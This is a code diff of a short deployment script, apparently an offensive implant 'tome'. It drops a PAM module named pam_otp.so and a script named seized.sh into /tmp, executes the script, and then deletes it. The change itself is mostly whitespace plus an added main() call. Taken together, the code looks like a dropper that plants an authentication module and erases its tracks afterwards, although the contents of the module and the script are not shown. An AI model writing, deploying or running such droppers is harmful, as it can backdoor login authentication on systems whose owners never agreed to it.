@@ -2,17 +2,21 @@ def drop_files():
     if file.is_dir("/tmp"):
         assets.copy("deploy_otptome/assets/pam_otp.so","/tmp/pam_otp.so")
         print("asset pam_otp.so copied down")
+        
         assets.copy("deploy_otptome/assets/seized.sh","/tmp/seized.sh")
         print("asset seized.sh copied down")
 def main():
-
     if file.is_file("/tmp/pam_otp.so"):
         print("[ERR] Module already deployed")
         return
-    
+
     drop_files()
     print("dropped files")
+
     sys.exec("/bin/bash",["/tmp/seized.sh"])
     print("executing seized")
+    
     file.remove("/tmp/seized.sh")
     print("removed seized")
+
+main()
